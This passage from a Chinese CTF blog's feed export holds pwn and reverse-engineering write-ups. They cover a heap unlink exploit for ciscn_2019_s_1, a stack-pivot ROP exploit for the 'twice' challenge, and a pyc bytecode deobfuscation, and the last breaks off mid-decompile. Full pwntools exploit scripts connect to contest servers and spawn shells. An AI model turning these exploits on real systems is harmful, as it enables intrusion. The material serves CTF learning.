class="hljs-number">9</span>)itr()</code></pre></div><p>由于其确定堆块的特殊性，在申请堆块到free got时，因为其在<code>0x000000000602018</code>，但是在经过逻辑运算处理后，放入bss后，想要再进行操作就有点困难，所以申请到<code>0x000000000602010</code> 就OK了。</p><h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3><p>保护：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>Add函数：最多可以申请33个堆，且问你堆的编号，并且根据这个编号作为索引上bss段来存储heap的地址。大小范围在<code>0x7f - 0x100</code>。</p><p>edit函数：</p><div class="hljs"><pre><code class="hljs c">v0[read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)heap[v2], (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)len[v2])] = <span class="hljs-number">0</span>;</code></pre></div><p>明显存在着off by null。且有key1控制着，只能编辑2次。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( key1 == <span class="hljs-number">2</span> )    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</code></pre></div><p>Show函数：<br>Key2有值才能用。</p><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><ul><li>由于没有开启pie保护，这样明显可以unlink攻击，申请一个32堆号的堆，大小0xf8，都是越大越好，为了上靠近key1、key2，然后进行控制.</li></ul><p>剩下的就很简单了。</p><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *import timelocal_file  = './ciscn_s_1'elf = ELF(local_file)context.log_level = 'debug'debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',29756)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h'rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()def add(idx,size,data):    sla('show\n','1')    sla('dex',str(idx))    sla('size',str(size))    sa('content',str(data))def free(idx):    sla('show\n','2')    sla('dex',str(idx))def edit(idx,data):    sla('show\n','3')    sla('dex',str(idx))    sa('content',str(data))def show(idx):    sla('show\n','4')    sla('dex',str(idx))key2 = 0x6022B8for i in range(7):    add(i,0xf8,'aaaaaaaa')add(7,0xf8,"aaaa")#8payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30)add(32,0xf8,payload)#32add(8,0x88,"aaaa")add(9,0xf8,"aaaa")add(10,0x88,'aaaa')for i in range(7):    free(i+1) # 由于32的堆块申请后破坏了0号堆块的在bss上地址的储存payload = 'a' * 0x80 + p64(0x180)edit(8,payload)free(9)payload = p64(0) * 3 + p64(0x00000000006021c8) + '\x00'  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)edit(32,payload)add(11,0x88,' ')show(11)r()libc_base = uu64(r(6)) - 0x3ebf20info_addr('libc_base',libc_base)free_hook = libc_base + 0x3ed8e8rec = rce18[1] + libc_basepayload = p64(0) * 3 + p64(free_hook)edit(32,payload)edit(32,p64(rec))free(11)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF暑假刷题-1&quot;&gt;&lt;a href=&quot;#BUUCTF暑假刷题-1&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF暑假刷题(1)&quot;&gt;&lt;/a&gt;BUUCTF暑假刷题(1)&lt;/h1&gt;&lt;h2 id=&quot;cmcc-simplerop&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>“第五空间” 智能安全大赛-twice</title>
    <link href="http://chumen77.xyz/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/06/28/“第五空间” 智能安全大赛/</id>
    <published>2020-06-28T12:43:20.845Z</published>
    <updated>2020-07-31T04:17:47.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="“第五空间”-智能安全大赛"><a href="#“第五空间”-智能安全大赛" class="headerlink" title="“第五空间” 智能安全大赛"></a>“第五空间” 智能安全大赛</h1><p>比赛时当天有考试，就做了个签道题。</p><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="查保护"><a href="#查保护" class="headerlink" title="查保护"></a>查保护</h3><div class="hljs"><pre><code class="hljs python">Arch:     amd64<span class="hljs-number">-64</span>-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><ul><li>程序可以给你2次的读操作，第一次读89字节，第二次读112字节</li><li>栈大小是<code>0x60</code>，存在栈溢出。</li></ul><div class="hljs"><pre><code class="hljs python">0x7fffffffe3b0 --&gt; 0x6097ecbc626822000x7fffffffe3b8 --&gt; 0x6097ecbc626822000128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:push   r15)0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;:test   eax,eax)0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:push   r15)0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:mov    edi,eax)0160| 0x7fffffffe3e0 --&gt; 0x10168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f ("/media/psf/mypwn/no5space/pwn")0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0</code></pre></div><ul><li>调试发现第一次read，可以leak canary 和一个栈地址，从而可以根据偏移算出栈上其他有用的地址。</li><li>第二次，需要填充一下canary，然后可以去攻击ret address</li></ul><p>但是，并没有拿到libc的地址，是无法拿到shell。<strong>由于可以溢出的字节有限，也没法进行rop。</strong></p><h3 id="获取libc地址"><a href="#获取libc地址" class="headerlink" title="获取libc地址"></a>获取libc地址</h3><p>此时，根据前面泄漏的栈地址，可以算出read函数的buf栈地址，然后<strong>栈迁移</strong>上去，然后进行rop来leak 出libc地址。</p><p>拿到libc地址以后，rop的终结地址为程序的<code>start</code>。让其清理栈，再次进行程序的漏洞利用。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'121.36.59.116'</span>,<span class="hljs-number">9999</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">"1"</span> * <span class="hljs-number">0x57</span> + <span class="hljs-string">'a'</span>sla(<span class="hljs-string">"&gt;"</span>,payload)ru(<span class="hljs-string">'a'</span>)canary = uu64(r(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x0a</span>print(hex(canary))s_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x70</span>print(hex(s_base))  pop_rsi_pop_r15_ret = <span class="hljs-number">0x0000000000400921</span>pop_rbp_ret = <span class="hljs-number">0x0000000000400690</span>pop_rdi_ret = <span class="hljs-number">0x0000000000400923</span>leave_ret = <span class="hljs-number">0x0000000000400879</span>rop = flat([<span class="hljs-number">0</span>,pop_rdi_ret,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],<span class="hljs-number">0x0400630</span>])payload = rop.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">'\0'</span>)payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret)<span class="hljs-comment"># debug()</span>sa(<span class="hljs-string">"&gt;"</span>,payload)r(<span class="hljs-number">1</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)ru(<span class="hljs-string">'1'</span>)rop = flat([<span class="hljs-number">0</span>,pop_rdi_ret,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],<span class="hljs-number">0x0400630</span>])payload = rop.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">'\0'</span>)payload += p64(canary) +p64(canary) + p64(libc_base+rce16[<span class="hljs-number">1</span>]) + p64(libc_base+rce16[<span class="hljs-number">1</span>])sla(<span class="hljs-string">"&gt;"</span>,payload)itr()</code></pre></div><ul><li>注意在第二次发送payload不要发出去换行符。</li><li>最后一次payload 中的rop什么的都是抄第一次的payload，只是把最后的ret address 改成 one gadget 。（只是填充字节用的）</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;“第五空间”-智能安全大赛&quot;&gt;&lt;a href=&quot;#“第五空间”-智能安全大赛&quot; class=&quot;headerlink&quot; title=&quot;“第五空间” 智能安全大赛&quot;&gt;&lt;/a&gt;“第五空间” 智能安全大赛&lt;/h1&gt;&lt;p&gt;比赛时当天有考试，就做了个签道题。&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF安恒月赛(6th)</title>
    <link href="http://chumen77.xyz/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <id>http://chumen77.xyz/2020/06/27/DASCTF安恒月赛(6th)/</id>
    <published>2020-06-27T14:27:37.170Z</published>
    <updated>2020-06-28T12:43:13.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-6th"><a href="#DASCTF安恒月赛-6th" class="headerlink" title="DASCTF安恒月赛(6th)"></a>DASCTF安恒月赛(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pyc文件恢复"><a href="#pyCharm-pyc文件恢复" class="headerlink" title="pyCharm(pyc文件恢复)"></a>pyCharm(pyc文件恢复)</h3><p>这个题基本参考<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>来做的。</p><h4 id="加载pyc-co-code"><a href="#加载pyc-co-code" class="headerlink" title="加载pyc co_code"></a>加载<code>pyc co_code</code></h4><div class="hljs"><pre><code class="hljs undefined">In [1]: import dis,marshalIn [2]: f=open('1.pyc')In [3]: f.read(4)Out[3]: '<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>'In [4]: f.read(4)Out[4]: 'jv<span class="hljs-symbol">\x</span>e7^'In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, 'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=', 'Are u ready?', 0, 32, 'a', '', 'great!waht u input is the flag u wanna get.', 'pity!')In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:('base64', 'a', 'raw_input', 'flag', 'b64encode', 'c', 'list', 'd', 'range', 'i', 'join', 'ohh')In [9]: code.co_codeOut[9]: "q<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00q<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>06d<span class="hljs-symbol">\x</span>ffd<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00l<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00j<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00x'<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00D]<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00c<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>19d<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>007<span class="hljs-symbol">\x</span>03&lt;qI<span class="hljs-symbol">\x</span>00Wd<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00j<span class="hljs-symbol">\n</span><span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00k<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00r<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00GHn<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00GHd<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00S"</code></pre></div><h4 id="使用dis库对co-code进行反编译"><a href="#使用dis库对co-code进行反编译" class="headerlink" title="使用dis库对co_code进行反编译:"></a>使用dis库对<code>co_code</code>进行反编译:</h4><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">10</span>]: dis.dis(code.co_code)          <span class="hljs-number">0</span> JUMP_ABSOLUTE       <span class="hljs-number">3</span>    &gt;&gt;    <span class="hljs-number">3</span> JUMP_ABSOLUTE    <span class="hljs-number">1536</span>          <span class="hljs-number">6</span> LOAD_CONST      <span class="hljs-number">25855</span> (<span class="hljs-number">25855</span>)          <span class="hljs-number">9</span> STOP_CODE         <span class="hljs-number">10</span> STOP_CODE         <span class="hljs-number">11</span> LOAD_CONST          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)         <span class="hljs-number">14</span> IMPORT_NAME         <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">17</span> STORE_NAME          <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">20</span> LOAD_CONST          <span class="hljs-number">2</span> (<span class="hljs-number">2</span>)         <span class="hljs-number">23</span> STORE_NAME          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)         <span class="hljs-number">26</span> LOAD_NAME           <span class="hljs-number">2</span> (<span class="hljs-number">2</span>)         <span class="hljs-number">29</span> LOAD_CONST          <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">32</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">35</span> STORE_NAME          <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">38</span> LOAD_NAME           <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">41</span> LOAD_ATTR           <span class="hljs-number">4</span> (<span class="hljs-number">4</span>)         <span class="hljs-number">44</span> LOAD_NAME           <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">47</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">50</span> STORE_NAME          <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">53</span> LOAD_NAME           <span class="hljs-number">6</span> (<span class="hljs-number">6</span>)         <span class="hljs-number">56</span> LOAD_NAME           <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">59</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">62</span> STORE_NAME          <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)         <span class="hljs-number">65</span> SETUP_LOOP         <span class="hljs-number">39</span> (to <span class="hljs-number">107</span>)         <span class="hljs-number">68</span> LOAD_NAME           <span class="hljs-number">8</span> (<span class="hljs-number">8</span>)         <span class="hljs-number">71</span> LOAD_CONST          <span class="hljs-number">4</span> (<span class="hljs-number">4</span>)         <span class="hljs-number">74</span> LOAD_CONST          <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">77</span> CALL_FUNCTION       <span class="hljs-number">2</span>         <span class="hljs-number">80</span> GET_ITER         <span class="hljs-number">81</span> FOR_ITER           <span class="hljs-number">22</span> (to <span class="hljs-number">106</span>)         <span class="hljs-number">84</span> STORE_NAME          <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)         <span class="hljs-number">87</span> LOAD_NAME           <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)         <span class="hljs-number">90</span> LOAD_NAME           <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)         <span class="hljs-number">93</span> DUP_TOPX            <span class="hljs-number">2</span>         <span class="hljs-number">96</span> BINARY_SUBSCR         <span class="hljs-number">97</span> LOAD_CONST          <span class="hljs-number">6</span> (<span class="hljs-number">6</span>)        <span class="hljs-number">100</span> INPLACE_ADD        <span class="hljs-number">101</span> ROT_THREE        <span class="hljs-number">102</span> STORE_SUBSCR        <span class="hljs-number">103</span> JUMP_ABSOLUTE      <span class="hljs-number">73</span>    &gt;&gt;  <span class="hljs-number">106</span> POP_BLOCK    &gt;&gt;  <span class="hljs-number">107</span> LOAD_CONST          <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)        <span class="hljs-number">110</span> LOAD_ATTR          <span class="hljs-number">10</span> (<span class="hljs-number">10</span>)        <span class="hljs-number">113</span> LOAD_NAME           <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)        <span class="hljs-number">116</span> CALL_FUNCTION       <span class="hljs-number">1</span>        <span class="hljs-number">119</span> STORE_NAME         <span class="hljs-number">11</span> (<span class="hljs-number">11</span>)        <span class="hljs-number">122</span> LOAD_NAME          <span class="hljs-number">11</span> (<span class="hljs-number">11</span>)        <span class="hljs-number">125</span> LOAD_NAME           <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)        <span class="hljs-number">128</span> COMPARE_OP          <span class="hljs-number">2</span> (==)        <span class="hljs-number">131</span> POP_JUMP_IF_FALSE   <span class="hljs-number">134</span>    &gt;&gt;  <span class="hljs-number">134</span> LOAD_CONST          <span class="hljs-number">8</span> (<span class="hljs-number">8</span>)        <span class="hljs-number">137</span> PRINT_ITEM        <span class="hljs-number">138</span> PRINT_NEWLINE        <span class="hljs-number">139</span> JUMP_FORWARD        <span class="hljs-number">5</span> (to <span class="hljs-number">147</span>)        <span class="hljs-number">142</span> LOAD_CONST          <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)        <span class="hljs-number">145</span> PRINT_ITEM        <span class="hljs-number">146</span> PRINT_NEWLINE    &gt;&gt;  <span class="hljs-number">147</span> LOAD_CONST          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)        <span class="hljs-number">150</span> RETURN_VALUE</code></pre></div><p>这里面需要注意的就是开头的：</p><div class="hljs"><pre><code class="hljs undefined">      <span class="hljs-number">0</span> JUMP_ABSOLUTE       <span class="hljs-number">3</span>&gt;&gt;    <span class="hljs-number">3</span> JUMP_ABSOLUTE    <span class="hljs-number">1536</span>      <span class="hljs-number">6</span> LOAD_CONST      <span class="hljs-number">25855</span> (<span class="hljs-number">25855</span>)      <span class="hljs-number">9</span> STOP_CODE     <span class="hljs-number">10</span> STOP_CODE</code></pre></div><p>明显加入了混淆，怎么突然就停止了<code>STOP_CODE</code>。接着就是想办法去除这些混淆，和修正<code>co_code</code>长度，期望修改后的opcode首行为</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>LOAD_CONST <span class="hljs-number">0</span>(<span class="hljs-number">0</span>)<span class="hljs-symbol">1 </span>LOAD_CONST <span class="hljs-number">1</span>(<span class="hljs-number">1</span>)</code></pre></div><p>其中这种二进制字节码对应的翻译结果：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x64</span> 操作为LOAD_CONST，用法举例：LOAD_CONST <span class="hljs-number">1</span>        HEX: <span class="hljs-number">640100</span><span class="hljs-number">0x71</span> 操作为JUMP_ABSOLUTE，用法举例：JUMP_ABSOLUTE <span class="hljs-number">14</span>                HEX: <span class="hljs-number">710e00</span><span class="hljs-number">0x65</span> 操作为LOAD_NAME，用法举例：LOAD_NAME <span class="hljs-number">1</span>                HEX: <span class="hljs-number">650100</span></code></pre></div><p>所以寻找：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>LOAD_CONST <span class="hljs-number">0</span>(<span class="hljs-number">0</span>)</code></pre></div><p>即为寻找<code>HEX : 640000</code>这个作为混淆字段结束。<br>开头怎么寻找呢。由于看前面3个字节对应一个含义，猜测：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>JUMP_ABSOLUTE       <span class="hljs-number">3</span></code></pre></div><p>￼￼￼￼￼￼<br>￼￼￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>那很明显混淆字段就是：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p><p>然后用工具删除即可，其中0x97就是<code>co_code</code></p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-variable"><span class="hljs-keyword">In</span></span> [<span class="hljs-number">12</span>]: <span class="hljs-function"><span class="hljs-title">len</span>(<span class="hljs-variable">code</span>.co_code)</span><span class="hljs-variable">Out</span>[<span class="hljs-number">12</span>]: <span class="hljs-number">151</span><span class="hljs-variable"><span class="hljs-keyword">In</span></span> [<span class="hljs-number">13</span>]: <span class="hljs-function"><span class="hljs-title">hex</span>(<span class="hljs-number">151</span>)</span><span class="hljs-variable">Out</span>[<span class="hljs-number">13</span>]: <span class="hljs-string">'0x97'</span></code></pre></div><p>所以去除这8个字节的混淆代码，然后修改<code>co_code</code>长度为<code>0x8f</code>。</p><h4 id="还原后的pyc开头"><a href="#还原后的pyc开头" class="headerlink" title="还原后的pyc开头"></a>还原后的pyc开头</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>反编译方法就多种多样了，可以在线什么的，我使用的<code>uncompyle6</code>.</p><div class="hljs"><pre><code class="hljs undefined">uncompyle6 -o <span class="hljs-number">1.</span>py <span class="hljs-number">1.</span>pyc</code></pre></div><div class="hljs"><pre><code class="hljs undefined"># uncompyle6 version <span class="hljs-number">3.7</span><span class="hljs-number">.1</span># Python bytecode <span class="hljs-number">2.7</span> (<span class="hljs-number">62211</span>)# Decompiled <span class="hljs-keyword">from</span>: Python <span class="hljs-number">2.7</span><span class="hljs-number">.16</span> (<span class="hljs-keyword">default</span>, Feb <span class="hljs-number">29</span> <span class="hljs-number">2020</span>, <span class="hljs-number">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">37</span>)# [GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">11.0</span><span class="hljs-number">.3</span> (clang<span class="hljs-number">-1103.0</span><span class="hljs-number">.29</span><span class="hljs-number">.20</span>) (-macos10<span class="hljs-number">.15</span>-objc-# Embedded file name: pyCharm.py# Compiled at: <span class="hljs-number">2020</span><span class="hljs-number">-06</span><span class="hljs-number">-15</span> <span class="hljs-number">21</span>:<span class="hljs-number">23</span>:<span class="hljs-number">54</span><span class="hljs-keyword">import</span> base64a = <span class="hljs-string">'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM='</span>flag = raw_input(<span class="hljs-string">'Are u ready?'</span>)c = base64.b64encode(flag)d = list(c)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):    d[i] += <span class="hljs-string">'a'</span>ohh = (<span 